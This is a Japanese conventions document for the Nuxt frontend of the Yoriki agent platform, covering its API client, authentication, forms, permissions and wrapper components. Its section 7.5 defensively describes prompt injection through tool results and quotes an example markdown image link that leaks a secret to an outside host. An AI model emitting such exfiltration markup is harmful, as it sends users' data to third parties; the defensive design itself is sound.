# フロントエンド実装規約（Nuxt / Nuxt UI）

Yorikiのフロントエンド（Nuxt、Nuxt UI）を実装するエージェント・開発者向けの規約。
API・認証・フォーム・権限・共通ラッパーの設計を定める。UIライブラリはNuxt UIを使う。

バックエンドの規約は [backend-conventions.md](backend-conventions.md)、典型的な画面の実装例は [frontend-examples.md](frontend-examples.md) にまとめている。

§12「避ける書き方」に挙げた点は使わない。

---

## 0 基本原則

本書で最も重要な章。以降の章と食い違う場合は、この章を優先する。

### 0.1 1つのフロントエンドで社員向けと管理者向けを提供する

- control planeは単一のドメインなので、社員向け画面と管理画面を1つのNuxtアプリで実装する。利用者の種類ごとにアプリを分けない。
- 社員向けはルート直下（`/conversations`、`/runs` 等）、管理向けは `/manage` 以下に置き、layoutを分ける。
- どの画面とボタンを表示するかは、ログインユーザーの権限で決める（§6）。ただし画面側の制御は表示の都合のためだけのもので、権限はサーバー側で強制する。

### 0.2 DRFに合わせて抽象化した部品を使う

API・認証・フォームの部品は、DRFの規約（snake_caseのJSON、カーソル方式のページング、フィールドごとの400エラー、`nonFieldErrors`）に合わせて作る。画面のコードから直接axiosを呼んだり、エラー応答を自前で解釈したりしない。

| 部品 | 役割 |
|---|---|
| `useAPI()` | DRFのViewSetに対応したAPIクライアント。snake_case⇄camelCaseの変換、セッションCookieとCSRFトークン、401時のログイン画面への移動 |
| `Paginated<T>` | カーソル方式のページングの応答（`results`、`next`、`previous`） |
| `createSubmit()` | 送信、loading、DRFのエラー辞書をまとめて扱う |
| `getValidationError()` | 400はフィールドごとのエラー辞書に、それ以外は `nonFieldErrors: [detail]` に変換する |
| `useAccountStore()` | ログイン状態と、`app/v1/my/` から取得したログインユーザー（権限を含む） |
| `usePermission()` | 権限コードの判定 |
| `D*` コンポーネント | Nuxt UIのラッパー。`errorMessages` の表示、API連動のオートコンプリート・テーブル・ダイアログ |

### 0.3 検証はサーバー、表示はフロントエンド

- 入力の検証はDRFのSerializerの責務（backend-conventions.md §0.3）なので、フロントエンドで同じ検証規則を書き直さない。送信ボタンを押せるかどうか（`canPost`）程度の確認だけにする。
- サーバーが返したエラーは、`createSubmit` の `errors` から各入力欄の `error-messages` と `DFormAlert` に表示する。

### 0.4 型はOpenAPIスキーマから生成する

- APIの型は手で書かず、drf-spectacularのスキーマから生成する（§3.3）。`api.ts` に型定義を手で書き足していく形にはしない。

---

## 1 技術構成

| 項目 | 採用 |
|---|---|
| フレームワーク | Nuxt 4（`ssr: false` のSPA） |
| UI | Nuxt UI 4（Tailwind CSS 4、Iconifyの `i-lucide-*` アイコン、日付は `@internationalized/date`） |
| 多言語化 | @nuxtjs/i18n（§10） |
| 状態 | Pinia（setup store） |
| HTTP | axios＋qs、change-case（snake_case⇄camelCase） |
| 型生成 | openapi-typescript＋type-fest |
| リアルタイム | SSE（[realtime.md](realtime.md)） |
| ユーティリティ | @vueuse/nuxt、date-fns |
| ツールのバージョン | mise（リポジトリルートの `mise.toml` でNode.js 26とpnpmを固定） |
| パッケージ管理 | pnpm |
| lint | ESLint（`@nuxt/eslint`＋`eslint-config-prettier`） |
| 整形 | Prettier（`semi: false`、`singleQuote: true`、`printWidth: 120`） |
| 型チェック | `pnpm typecheck`（`nuxt typecheck`、vue-tsc） |

- 各ライブラリは最新の安定版を使う。バージョンを上げるときは `pnpm typecheck` と `/dev/inputs`（§7.3）の表示を確認する。
- pnpmは、依存のinstall scriptを `pnpm-workspace.yaml` の `allowBuilds` で許可したものだけ実行する。新しく許可するときは、そのパッケージが本当にscriptを必要とするか確認する。
- pnpmの `minimumReleaseAge`（公開直後の版を避ける設定）で止められた版を例外にする場合は、`minimumReleaseAgeExclude` にパッケージ名と版を指定して追加し、理由をコミットメッセージに書く。

PrimeVue、`@primevue/*`、`tailwindcss-primeui`、`primeicons`、`lucide-vue-next`、`vee-validate`、`zod`、`@tanstack/vue-table`（Nuxt UIの `UTable` が内部で使うため直接は入れない）は入れない。

---

## 2 ディレクトリ

```
frontend/
├── nuxt.config.ts
├── package.json
├── pnpm-workspace.yaml     # install script の許可（allowBuilds）
├── tsconfig.json           # .nuxt/tsconfig.*.json を参照するだけ
├── i18n/i18n.config.ts     # vue-i18nの設定（§10）
├── i18n/locales/ja.json    # 日本語は空（キーがそのまま日本語の文）
├── vitest.config.ts        # 単体テスト（Nuxtの環境で動かす）
├── test/nuxt/              # 単体テスト（api/、composables/、components/。§13）
└── app/                      # （未）が付いたものは、これから作る
    ├── app.vue                 # <UApp :locale="useUiLocale()"><NuxtLayout><NuxtPage /></NuxtLayout></UApp>
    ├── app.config.ts           # （未）Nuxt UIのテーマ（primary / neutralの色）
    ├── error.vue               # エラー画面（403・404・その他。APIのエラーはサーバーの detail を表示）
    ├── assets/css/main.css     # @import "tailwindcss"; @import "@nuxt/ui";
    ├── api/
    │   ├── schema.d.ts         # openapi-typescriptが生成（手で編集しない）
    │   ├── types.ts            # 生成した型をcamelCaseにした画面用の型
    │   ├── client.ts           # axiosの生成、変換、interceptor、エラー変換
    │   ├── resource.ts         # ViewSetに対応したresource定義のヘルパー
    │   └── index.ts            # useAPI()。リソースを組み立てる
    ├── components/
    │   ├── common/             # D*ラッパー（prefixなしで自動import）
    │   └── <domain>/           # 業務コンポーネント（例：run/RunCancelDialog.vue）
    ├── composables/            # field, date, form, list, confirm, account, permission, manage, locale, markdown, stream, llm, sso, user, conversation, run, artifact, skill, connector
    ├── layouts/                # default（社員。サイドバーに会話の一覧）、anonymous（ログイン・開発用）、manage（管理）
    ├── middleware/             # auth.global.ts、permission.global.ts、manage.ts（/manage の入口）
    ├── pages/                  # 社員向けはルート直下、管理向けは manage/ 以下、dev/ は開発用
    └── plugins/                # auth.client.ts、error-handler.ts
```

```ts
// nuxt.config.ts（抜粋）
export default defineNuxtConfig({
  ssr: false,
  modules: ['@nuxt/ui', '@nuxtjs/i18n', '@pinia/nuxt', '@vueuse/nuxt'],
  css: ['~/assets/css/main.css'],
  components: {
    dirs: [{ path: '~/components/common', pathPrefix: false }, '~/components'],
  },
  imports: { dirs: ['api'] },
  i18n: {
    strategy: 'no_prefix',
    defaultLocale: 'ja',
    locales: [{ code: 'ja', language: 'ja-JP', name: '日本語', file: 'ja.json' }],
    detectBrowserLanguage: { useCookie: true, cookieKey: 'i18n_locale', fallbackLocale: 'ja' },
  },
  nitro: {
    devProxy: {
      '/api': { target: `${process.env.YORIKI_DEV_API_ORIGIN ?? 'http://localhost:8000'}/api`, xfwd: true },
    },
  },
  runtimeConfig: {
    public: { apiEndpoint: '/api/' },
  },
})
```

- 環境依存の値は `runtimeConfig` に定義し、環境変数（`NUXT_PUBLIC_*`）で上書きできるようにする。コードに値を直接書かない。
- APIは常に画面と同じオリジンの `/api/` で呼ぶ（セッションCookieで認証するため）。開発時はNuxtの `nitro.devProxy` で `/api` をDjangoへ転送する（転送先は `YORIKI_DEV_API_ORIGIN`、既定は `http://localhost:8000`）。本番はnginxが同じ役割を持つ。
- devProxyは `xfwd: true` で `X-Forwarded-*` ヘッダーを付けて転送し、`changeOrigin` は使わない。ブラウザが送った `Host`（`localhost:3000`）がそのままDjangoに届くので、DjangoのCSRFの確認とSSOのリダイレクトURIが `http://localhost:3000` で正しく動く。
- ローカル開発では、リポジトリルートの `.envrc`（direnv）で設定する。本番では実行環境から環境変数を渡す。
- 本番は `nuxt build` で作ったサーバー（`node .output/server/index.mjs`）で配信し、起動時の環境変数が反映されるようにする。`nuxt generate` の静的ファイルにすると、`NUXT_PUBLIC_*` の値がビルド時に固定されるので使わない。

- `components/common/` 以下はprefixなしで、`components/<domain>/` 以下はディレクトリ名がprefixになって自動importされる。業務コンポーネントのファイル名は、ドメイン名から始める（`components/run/RunCancelDialog.vue` → `<RunCancelDialog>`）。
- `components/`、`composables/`、`api/` から自動importされるものは、`import` 文を書かない。`ref<InstanceType<typeof XxxForm>>` のように型として使う場合だけ、明示的にimportしてよい。

---

## 3 API

### 3.1 クライアント

`api/client.ts` の `createHttp()` は、axiosのインスタンスを作り、認証にセッションCookieとCSRFを使う。

- リクエストのbodyは `snakeProps()`、クエリは `qs.stringify(snakeProps(params), { indices: false })` で変換する。
- 利用者・エージェント・DBがキーを決めるJSON（SkillのJSON Schema、期待する業務結果・業務結果、Toolの引数、Connectorの列名 → 説明、platform → digest）は、項目の名前だけを変換し、値の中のキーは変換しない（`client.ts` の `RAW_VALUE_KEYS`）。変換すると `invoice_no` が `invoiceNo` に、`VendorCode` が `vendor_code` に変わるため。このような項目をAPIに足したら、名前を `RAW_VALUE_KEYS` に加える。
- レスポンスがJSONなら `camelProps()` で変換し、`data` だけを返す（`AxiosResponse` は返さない）。
- 認証はDjangoのセッションCookieで行う（`withCredentials: true`）。トークンを画面側で持たず、`Authorization` ヘッダーも付けない。
- 書き込みの要求には、Cookieの `csrftoken` を `X-CSRFToken` ヘッダーに付ける（axiosの `xsrfCookieName` / `xsrfHeaderName`）。
- 401（未ログイン）を受けたら、`/login?next=<現在のパス>` へ移動する。403（権限不足）では移動しない。
- APIの呼び出しがネットワークエラー（応答を受け取れない。タイムアウトは除く）になった場合と、JSONを期待した要求にJSONでない応答が返った場合は、画面ごと再読み込みする。前段に認証プロキシ（oauth2-proxy）がある環境では、そのセッションが切れるとAPIの呼び出しがIdPへのリダイレクトになり、XHRではCORSのエラーかJSONでない応答になるため。再読み込みすれば、認証プロキシが改めてログインさせる（deployment.md §8.6）。オフライン等で再読み込みを繰り返さないよう、30秒以内に一度再読み込みしていたら再読み込みせず、通常のエラーとして表示する（`app/api/client.ts` の `reloadForSessionLost`）。
- `Accept-Language` に現在の言語を付ける。DjangoのLocaleMiddlewareにより、Serializerのエラーメッセージもその言語で返る。
- 401の処理は `createHttp()` の第3引数（`HttpHooks.onUnauthorized`）で渡す。`api/index.ts` でログイン画面への移動をつないでいる。
- エラーには `statusCode`（HTTPステータス）を付けて返す。Nuxtの `createError` / `showError` にそのまま渡せる。
- タイムアウトは通常15秒、ファイル送信だけ60秒にする（`API_TIMEOUT`、`UPLOAD_TIMEOUT`）。ファイルを送る要求は `http.post(url, formData, { timeout: UPLOAD_TIMEOUT })` のように指定する。エージェントの長い処理は非同期のRunなので、APIの応答を長く待つことはない。

### 3.2 リソース定義

DRFのViewSetは形が揃っているので、`api/resource.ts` のヘルパーで定義する。各リソースのlist / get / create / update / deleteを手で書かない。

実装は `frontend/app/api/resource.ts`。

| 関数 | 対応するViewSet | 持つメソッド |
|---|---|---|
| `readOnlyResource<T, TParams>(http, base, id?)` | `ReadOnlyModelViewSet` | `list(params)`、`get()` |
| `resource<T, W, TParams>(http, base, id?)` | `ModelViewSet` | 上記＋`create(data)`、`update(data)`、`patch(data)`、`delete()` |

`T` は出力の型、`W` は入力の型（`<名前>Request`）、`TParams` は一覧の検索条件の型。ViewSetが持たない操作（`list` だけのViewSet等）は、ヘルパーを使わずに必要なメソッドだけを書く。

```ts
// api/index.ts（抜粋）
const createAPI = () => {
  const config = useRuntimeConfig()
  const { $i18n } = useNuxtApp()
  const http = createHttp(config.public.apiEndpoint, () => $i18n.locale.value, { onUnauthorized })
  return {
    http,
    account: {
      get: () => http.get<MyUser, MyUser>('app/v1/my/'),
    },
    runs: (id?: string) => ({
      ...readOnlyResource<Run, RunListParams>(http, 'app/v1/runs', id),
      cancel: (data: RunCancel) => http.post<Run, Run>(`app/v1/runs/${id}/cancel/`, data),
      activeCount: () => http.get<Count, Count>('app/v1/runs/active_count/'),
      // AppRunEventViewSet は list だけなので、list だけを定義する
      events: () => ({
        list: (params?: ListParams) =>
          http.get<Paginated<RunEvent>, Paginated<RunEvent>>(`app/v1/runs/${id}/events/`, { params }),
      }),
      clarifications: (cid?: string) => ({
        ...readOnlyResource<Clarification>(http, `app/v1/runs/${id}/clarifications`, cid),
        answer: (data: ClarificationAnswer) =>
          http.post<Clarification, Clarification>(`app/v1/runs/${id}/clarifications/${cid}/answer/`, data),
      }),
    }),
    manage: {
      destinations: (id?: string) => resource<Destination, DestinationWrite>(http, 'v1/destinations', id),
    },
  }
}

let api: ReturnType<typeof createAPI> | null = null
export const useAPI = () => (api ??= createAPI())
```

- 呼び出しの形は `api.<リソース>(id).<操作>()` にする。子リソースは `api.runs(runId).clarifications(cid).answer(data)` のように入れ子にする。
- 管理向け（`v1/`）のリソースは `api.manage.*` の下に置き、社員向け（`app/v1/`）と名前空間を分ける。ログイン状態や自分の情報（`app/v1/my/`、`app/v1/auth/...`）は、管理者も含め全員が使うので社員向けの `app/v1/` に置く。
- ViewSetの `@action` は、リソースの中に同じ名前（camelCase）のメソッドとして追加する。
- `http.get<T, T>` のように、2つ目の型引数で戻り値の型を指定する（interceptorが `data` だけを返すため）。

### 3.3 型の生成

```bash
# バックエンドでスキーマを出力し、フロントエンドで型を生成する
cd api && uv run python src/manage.py spectacular --file ../frontend/schema.yaml --validate --fail-on-warn
cd frontend && pnpm gen:api   # openapi-typescript schema.yaml -o app/api/schema.d.ts
```

```ts
// api/types.ts
import type { CamelCasedPropertiesDeep } from 'type-fest'
import type { components } from './schema'

type Schemas = components['schemas']
type Api<K extends keyof Schemas> = CamelCasedPropertiesDeep<Schemas[K]>

export type MyUser = Api<'MyUser'>
export type Count = Api<'Count'>
export type Run = Api<'Run'>
export type RunEvent = Api<'RunEvent'>
export type RunCancel = Api<'RunCancelRequest'>
// モデル名が ClarificationRequest なので、これは出力用の型（入力用は ClarificationRequestRequest）
export type Clarification = Api<'ClarificationRequest'>
export type ClarificationAnswer = Api<'ClarificationAnswerRequest'>
export type Destination = Api<'Destination'>
export type DestinationWrite = Api<'DestinationRequest'>

// 一覧の検索条件（バックエンドの FilterSet と合わせる）
export type RunListParams = ListParams & { status?: number }
```

- バックエンドの `SPECTACULAR_SETTINGS` で `COMPONENT_SPLIT_REQUEST: True` を設定する。こうすると、読み取り専用の項目を除いた入力用の型（`<名前>Request`）が別に生成される。
- APIの型はクライアントがcamelCaseに変換した後の形で使う。生成した型をsnake_caseのまま画面で使わない。
- Serializerを変更したら、スキーマと型を生成し直し、型エラーが出た箇所を直す。
- 一覧の検索条件（`RunListParams` 等）は、スキーマのquery parameterから作るか、`ListParams` を拡張して定義する。

### 3.4 ページング

| 用途 | 使うもの |
|---|---|
| 表の前後ページ | `useCursorList()`（`DDataTable` の内部で使う） |
| 選択肢の追加読み込み | `DAutocomplete`（`next` のURLを `api.http.get(next)` で取得する） |
| 全件が必要な小さな一覧 | `useFetchAll()` |

`next` と `previous` はDRFが返した完全なURLなので、そのまま `api.http.get(url)` に渡す。自分でcursorのクエリを組み立てない。

### 3.5 詳細の取得とエラー画面

- 詳細ページの取得は `useAsyncData` で行い、失敗したら `createError` でエラー画面にする。

```ts
const { data: run, error, refresh } = await useAsyncData(`run-${runId}`, () => api.runs(runId).get())
if (error.value) throw createError(error.value)   // statusCode（404 / 403 等）を引き継ぐ
```
- `plugins/error-handler.ts` で、処理されなかった `AxiosError`（コンポーネントの `vue:error` と `unhandledrejection`）を `showError({ statusCode, data: { detail } })` に変換する。`detail` は `makeErrorMsg()` の文で、`error.vue` に表示する。401はAPIクライアントがログイン画面へ移動させるので、エラー画面にしない。
- `error.vue` は、ステータス（403・404・その他）ごとの見出しと案内、`data.detail` を表示する。`error.message` は利用者向けの文ではない（英語の内部メッセージ等）ので表示しない。`error.vue` は `app.vue` の代わりに描画されるので、`UApp` を自分で置く（`useUiLocale()`）。

---

## 4 認証

ログインは、すべてバックエンドで処理する（backend-conventions.md §6.2）。方法は社内SSO（django-allauthのsocialaccount。初期はGoogle WorkspaceとMicrosoft 365（Entra ID））と、Yorikiのアカウント（メールアドレスとパスワード）の2つで、有効なSSOの設定があれば社員はSSOだけを使う（design.md §10.0）。フロントエンドは認証基盤ごとのSDKを持たない。ログイン状態はDjangoのセッションCookieで保つ。前段に認証プロキシ（oauth2-proxy）がある環境でも、Yorikiのログイン画面とログインの流れは変えない（認証プロキシはバリアとして置くだけ。deployment.md §8.6）。

- 起動時に `plugins/auth.client.ts` で `await useAccountStore().init()` を実行する。この中で `app/v1/auth/session/` を呼んでCSRFのCookieを受け取り、`app/v1/my/` からログインユーザーを取得する。
- `middleware/auth.global.ts` で、未ログインのユーザーを `/login?next=<元のパス>` に移動させる。ログインの要らないページ（`/login`、`dev/` の開発用ページ）には `definePageMeta({ auth: false })` を付ける。
- APIに届かず起動時の確認に失敗した場合は、未ログインとして扱い、ログイン画面を表示する。
- ログイン画面（`pages/login.vue`、`layouts/anonymous.vue`）は、`app/v1/auth/providers/` の応答で表示を決める。有効な認証基盤があればそのボタンを並べ、パスワードの欄は出さない（`/login?method=password` を開いたときだけ、基盤管理者用に出す）。認証基盤がなければパスワードの欄を出す。パスワードでのログインは `app/v1/auth/session/` へのPOSTで行い、`createSubmit` でエラーを表示する。ボタンを押したら、バックエンドのログイン開始URLへ画面ごと移動する（POSTのフォームで送り、CSRFトークンを付ける）。認証基盤から戻った後は、バックエンドが `next` のパスへリダイレクトする。許可されていないアカウントや認証の失敗では、バックエンドが `/login?error=not_allowed`、`/login?error=failed` へ戻すので、ログイン画面でその旨を表示する。
- ログアウトは `app/v1/auth/session/` へのDELETEで行い、ログイン画面へ移動する。
- 前段の認証プロキシのセッションが切れた場合は、§3.1のとおり画面ごと再読み込みする。ログアウトで消すのはYorikiのセッションだけにし、認証プロキシのセッションは消さない（前段の基盤のものなので）。
- 招待・再設定のリンク（`/invitation#<token>`。`auth: false`。tokenはアクセスログに残らないようURLのフラグメントに置き、APIへは本文で送る）では、本人がパスワードを設定し、そのままログインした状態にする。期限切れ・使用済みのリンクや、SSOが有効になって使えなくなったリンクでは、その旨（SSOの場合はSSOでログインすること）を案内する。
- 画面とAPIクライアントが使うのは、`useAccountStore` の `isAuthenticated`、`user`、`init()`、`login()`、`logout()` だけにする。
- 外部の認証SDK（Auth0等）、Django JWTとの交換、トークンのrefreshは使わない。

---

## 5 フォーム

### 5.1 createSubmit

```ts
const { onSubmit, loading, errors } = createSubmit({
  form,
  fn: ({ id, ...data }) => api.manage.destinations(id!).patch(data),
  onSuccess: (result) => { ... },
  onError: (err) => { ... },
})
```

- `errors` はDRFのエラー辞書（camelCaseに変換済み）。各入力欄に `:error-messages="errors.address"`、フォームの先頭に `<DFormAlert :errors="errors" />` を置く。
- 400以外のエラー（403、409等）は `errors.nonFieldErrors` に `detail` が入り、`DFormAlert` に表示される。
- 成功・失敗の通知は `useToast()`（Nuxt UI）で出す。失敗の文言は `makeErrorMsg(err)` で作る（400なら「入力に問題があります。修正してください。」、それ以外はサーバーの `detail`）。

### 5.2 Form / Dialog / Select の3点セット

1つのリソースの入力UIは、次の3種類のコンポーネントに分ける。

| コンポーネント | 役割 |
|---|---|
| `<Domain>Form.vue` | 入力欄と `createSubmit`。`v-model` で対象を受け取り、`created` / `updated` / `failed` をemitする（`failed` の引数は、`createSubmit` の `onError` が受け取る `unknown` 型のエラー）。`defineExpose({ onSubmit, loading, canPost })` |
| `<Domain>Dialog.vue` | `DDialog` で `Form` を包む。`#trigger="{ on }"` スロットで開くボタンを受け取り、フッターに保存ボタンを置く |
| `<Domain>Select.vue` | `DAutocomplete` で検索・選択する。必要ならフッターから `Form` で新規作成できる |

- Formは「新規」と「編集」を同じコンポーネントで扱う。`emptyForm()` で初期値を作り、`watch(modelValue, ..., { immediate: true })` でフォームに反映する。
- 送信ボタンはFormの外（DialogやページのDialogフッター）に置き、Formの `ref` から `onSubmit` を呼ぶ。

### 5.3 actionのフォーム

ViewSetの `@action`（停止、回答、公開等）も、入力があれば同じ形のFormとDialogにする（例：`RunCancelDialog`、`ClarificationAnswerForm`）。actionのSerializerが返すエラーも、同じ `createSubmit` で表示する。

---

## 6 権限

### 6.1 権限コード

```ts
// composables/permission.ts
export const PermissionCode = {
  MANAGE_DESTINATIONS: 'delivery.can_manage_destinations',
  PUBLISH_COMPANY_SKILLS: 'skill.can_publish_company_skills',
} as const
export type PermissionCode = (typeof PermissionCode)[keyof typeof PermissionCode]

export const usePermission = defineStore('permission', () => {
  const account = useAccountStore()
  const permissions = computed(() => account.user?.allPermissions ?? [])
  const hasPermission = (code: PermissionCode) => permissions.value.includes(code)
  const hasAny = (codes: PermissionCode[]) => codes.some(hasPermission)
  return { permissions, hasPermission, hasAny }
})
```

- 権限コードはDjangoの `app_label.codename` の形で、`app/v1/my/` の `allPermissions` から判定する（`usePermission`）。
- 使う権限コードは `PermissionCode` に定数として追加し、画面のコードに文字列を直接書かない（`Permissions` はDOMの型名と衝突するので使わない）。
- 接続先・Connectorの画面は、APIと同じDjango標準のpermission（`connector.view_databaseconnection`・`add_*`・`change_*`・`delete_*`）で、ページ・追加・更新・削除のボタンを出し分ける。Connectorの一覧はAPIが所属で絞る。基盤管理者だけが使える画面（LLMの接続等）は、そのModelのDjango標準のpermission（`llm.change_llmconnection` 等）で出し分ける。基盤管理者はすべてのpermissionを持つ。APIは `PlatformAdmin` で守っている（backend-conventions.md §6.3）。`isPlatformAdmin` では判定しない。
- 役割（業務管理者・Skill公開者等）の名前では判定しない。役割はpermissionをまとめたGroupで、`allPermissions` にはGroupから得たpermissionも含まれる。基盤管理者はすべてのpermissionを持つ（backend-conventions.md §6.3）。

### 6.2 画面・メニュー・ボタン

- ページの権限は `definePageMeta({ permission: PermissionCode.X })` で宣言し、`middleware/permission.global.ts` で確認する。権限がなければ403のエラー画面にする。
- `permission` に配列を指定した場合は、いずれか1つを持っていればよい（`hasAny`）。
- `definePageMeta` で `permission`・`auth` を型付きで書けるよう、`app/types/page-meta.d.ts` で `PageMeta` を拡張している。
- 管理画面のサイドメニューは `composables/manage.ts` の `useManageMenu()` に1か所で定義する。各リンクに `permission`（リンク先のページの `definePageMeta` と同じもの）を持たせ、権限のない項目は表示しない。見出し（`children` を持つ項目。例：Connector → DB Connector → 接続先・Connector）で入れ子にでき、表示できるリンクが1つもない見出しは出さない。`items` はメニューの木、`links` は表示できるリンクを平らにしたもので、見出しの文字・`/manage` の最初の移動先・入口の判定には `links` を使う。
- `pages/manage.vue` の `definePageMeta({ layout: 'manage', middleware: 'manage' })` は `/manage` 以下の全ページに適用される（route metaは親から子に引き継がれる）。`middleware/manage.ts` は、表示できるリンクが1つもなければ403にする。`/manage` に入れる権限の一覧を別に持たず、メニューの定義から決める。`/manage` 自体はメニューの最初の項目へ移動する。
- 社員向けのlayoutの「管理」の入口も、表示できるメニュー項目があるときだけ出す。
- ボタンや操作は `v-if="hasPermission(PermissionCode.X)"` で出し分ける。コメントで「サーバー側でも403で弾かれる」ことを書いておく。
- 特定の組織IDやユーザーIDをフロントエンドに直接書いて機能を出し分けない。出し分けが必要なら、サーバーが権限か設定値として返す。

---

## 7 共通コンポーネント（D*ラッパー）

### 7.1 方針

- 入力欄、フォーム、ダイアログ、ドロワー、API連動の表・オートコンプリートは、必ず `D*` ラッパーを使う。画面や業務コンポーネントで `UInput` や `UModal` を直接使わない。
- 表示だけの部品（`UCard`、`UBadge`、`UIcon`、`UAvatar`、`UTooltip` 等）は、Nuxt UIを直接使ってよい。
- 入力のラッパーは、すべて `DFormField` で入力欄を包む。ラベル、必須マーク、ヒント、DRFのエラーメッセージの表示位置と見た目を、この1か所で決める。
- ラッパーのpropsは共通の形（`label`、`hint`、`errorMessages`、`required`、`showLabel`、`v-model`）にそろえる。業務コンポーネントがUIライブラリの違いを意識しなくて済むようにする。
- 値は、DRFが受け渡す形のまま `v-model` で扱う（日付は `'YYYY-MM-DD'`、日時はISO 8601、時刻は `'HH:MM'`、DecimalFieldは文字列）。Nuxt UIの値（`CalendarDate` 等）への変換はラッパーの中だけで行う。
- それ以外のpropsとイベントは、`v-bind="$attrs"` でNuxt UIのコンポーネントにそのまま渡す（`placeholder`、`disabled`、`size` 等）。`class` はラッパーの外枠に付く。
- ラッパー内の文言（「選択してください」「前へ」等）も `$t()` で出す（§10）。

### 7.2 一覧

実装は `frontend/app/components/common/` にある。

| ラッパー | Nuxt UI | v-modelの型 | 用途・特徴 |
|---|---|---|---|
| `DFormField` | `UFormField` | — | 入力の共通の枠。`hint` は入力欄の下に出し、エラーがある間はエラーに置き換わる |
| `DTextField` | `UInput` | `string \| null` | 1行のテキスト。`#prepend` / `#append` スロット |
| `DTextarea` | `UTextarea` | `string \| null` | 複数行。高さは内容に合わせて伸びる |
| `DNumberField` | `UInputNumber` | `number \| null` | IntegerField / FloatField |
| `DDecimalField` | `UInputNumber` | `string \| null` | DecimalField。`decimalPlaces` 桁の文字列で受け渡す |
| `DSelect` | `USelectMenu` | 値・値の配列 | 固定の選択肢（choices）。`items` は `{ value, title }`（`itemValue` / `itemTitle` で変更可）。`clearable`、`searchable`、`multiple` |
| `DAutocomplete` | `USelectMenu` | 値・値の配列 | APIを検索して選ぶ。`searchFn` にViewSetの `list` を渡す。末尾までスクロールすると `next` を読む。`initialSelected` で選択済みの表示名を復元する。`#footer` に新規作成ボタンを置ける |
| `DCheckbox` | `UCheckbox` | `boolean` | `labelPosition`（`inline` / `top`） |
| `DSwitch` | `USwitch` | `boolean` | 有効・無効の切り替え |
| `DRadioGroup` | `URadioGroup` | 値 | `variant="card"` で説明付きのカード |
| `DCheckboxGroup` | `UCheckboxGroup` | `string[]` | 複数を選ぶ。`variant="card"` で説明付きのカード。値は文字列だけ（Nuxt UIの制約） |
| `DSelectButton` | `UFieldGroup`＋`UButton` | 値 | 2〜4個の選択肢をボタンで選ぶ |
| `DDatePicker` | `UInputDate`＋`UCalendar` | `'YYYY-MM-DD'` | 日付。キーボード入力とカレンダーの両方。`min` / `max` |
| `DDateTimePicker` | `UInputDate`（分まで）＋`UCalendar` | ISO 8601 | 日時。表示はローカル時刻、送信はUTCのISO文字列 |
| `DDateRange` | `UInputDate range`＋`UCalendar` | `v-model:from` / `v-model:to` | 期間。検索条件の `xxx_from` / `xxx_to` に使う。エラーは例外として `errorMessages` ではなく `from-error-messages` / `to-error-messages` で渡す |
| `DTimeField` | `UInputTime` | `'HH:MM'` | 時刻（24時間表記） |
| `DFileInputField` | `UFileUpload` | `File \| File[] \| null` | ファイル選択とドラッグ＆ドロップ、画像のプレビュー |
| `DFormAlert` | `UAlert` | — | `errors.nonFieldErrors` の表示 |
| `DFormStack` / `DFormSection` | （div / section） | — | 入力の縦並び、見出し付きの区切り |
| `DBtn` | `UButton` | — | サイズの既定値をそろえたボタン |
| `DDialog` | `UModal` | `v-model:open` | `#trigger="{ on }"`、`#header`、`#content`、`#footer="{ closeDialog }"`。`openDialog` / `closeDialog` をexpose |
| `DDrawer` | `USlideover` | `v-model:open` | 詳細表示（子ルートで開く、§8.2） |
| `DDataTable` | `UTable` | `v-model:reload-key` | `fetch` と `params` を受け取り、カーソル方式で前後のページを読む。セルは `#<key>-cell` スロット |
| `DConfirmModal` | `UModal` | — | `useConfirmDialog()` から開く。`await confirm({ title })` が `true` / `false` を返す |

```vue
<DTextField v-model="form.name" :label="$t('名前')" required :error-messages="errors.name" />
<DAutocomplete
  v-model="form.modelProfile"
  :label="$t('エージェント')"
  :search-fn="api.modelProfiles().list"
  item-description="description"
  :initial-selected="conversation?.modelProfileInfo"
  :error-messages="errors.modelProfile"
/>
<DDateRange v-model:from="params.createdFrom" v-model:to="params.createdTo" :label="$t('開始日時')" />
```

### 7.3 確認用ページ

開発サーバーの `/dev/inputs` に、すべての入力ラッパーを並べたページがある（本番ビルドでは404）。「エラー表示を確認する」を有効にすると、すべての欄にエラーを表示できる。ラッパーを追加・変更したら、このページに追加して、通常の表示とエラーの表示を確認する。

### 7.4 Nuxt UIで使うもの

| 用途 | Yoriki |
|---|---|
| トースト通知 | Nuxt UIの `useToast()`（`color`、`title`、`description`） |
| 確認ダイアログ | `useConfirmDialog()`（`useOverlay()` で作る） |
| 見た目の一括調整 | `app.config.ts` の `ui` でテーマを調整する |
| 日付の入力 | `UInputDate` / `UCalendar`（`@internationalized/date`）。DRFの文字列との変換は `composables/date.ts` |
| メニュー・サイドバー | `UDashboardGroup`、`UDashboardSidebar`、`UNavigationMenu` |
| 処理中の表示 | 原則として各ボタン・表の `loading` で表すようにし、全画面スピナーは使わない |
| 会話画面 | Nuxt UIのChat系コンポーネント（`UChatMessages`、`UChatMessage`、`UChatPrompt`、`UChatTool`、`UChatReasoning` 等）を使う |
| Markdownの表示 | `MarkdownContent`（`components/common/`。変換は `composables/markdown.ts` の `renderMarkdown()`）。§7.5 |

### 7.5 エージェントの応答（Markdown）の表示

エージェントの応答には、Toolの結果を通じて外から来た文（ファイル、Webページ、DBの値）が混ざりうる。prompt injectionで、画面を偽装する要素や、情報を外へ送る仕掛けを書かせられることがあるので、信頼できない入力として表示する。

- Markdownは `MarkdownContent` で表示する。変換は `markdown-it` で行い、生のHTMLは要素にせず書いたまま表示する（`html: false`）。
- 画像は読み込まない（`image` の規則を無効にする）。`![](https://外部/?d=<秘密>)` のように、URLに情報を載せて外へ送らせないため。本番のCSP（`img-src 'self'`）とあわせて二重に防ぐ。成果物の画像は、成果物の機能（`/api/files/`）で表示する。
- リンクは、markdown-itが `javascript:` 等の危険なURLを除き、`target="_blank"`・`rel="noopener noreferrer"` で開く。
- `@nuxtjs/mdc`（Nuxt Content・Nuxt UIのProseで使うもの）は使わない。執筆者を信頼する前提の仕組みで、生のHTML（`<style>`・`<form>`・`<iframe>`）、Vueのコンポーネントの記法、`@click` 等の束縛をそのまま描くため。
- `v-html` を使うのは `MarkdownContent` の中だけにする。

---

## 8 ページ

### 8.1 構成

```
pages/
├── index.vue                     # 社員のホーム（/conversations へのリダイレクト）
├── login.vue                     # layout: anonymous
├── dev/inputs.vue                # 開発用（本番は404。layout: anonymous）
├── conversations/index.vue       # 会話を始めるウィザード（会話の一覧は layout のサイドバー）
├── conversations/[conversationId].vue
├── runs.vue
├── runs/[runId].vue              # 詳細ドロワー
